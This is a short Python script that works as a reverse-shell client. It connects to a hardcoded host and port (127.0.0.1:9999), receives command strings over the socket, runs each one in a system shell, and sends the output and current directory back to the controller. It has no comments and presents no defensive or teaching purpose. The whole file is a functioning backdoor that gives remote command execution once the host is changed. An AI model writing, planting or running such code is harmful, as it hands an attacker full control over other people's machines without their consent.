import socket, os, subprocess

HOST = '127.0.0.1'
PORT = 9999

SOCKET = socket.socket()
SOCKET.connect((HOST, PORT))

while True:
    data = SOCKET.recv(1024)
    #if data[:2].decode('utf-8') == 'cd':
    #    os.chdir(data[3:].decode('utf-8'))

    if len(data) > 0:
        cmd = subprocess.Popen((data[:].decode('utf-8')),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')

        currentWD = os.getcwd() + '>'
        SOCKET.send(str.encode(output_str + currentWD))

        print (output_str)
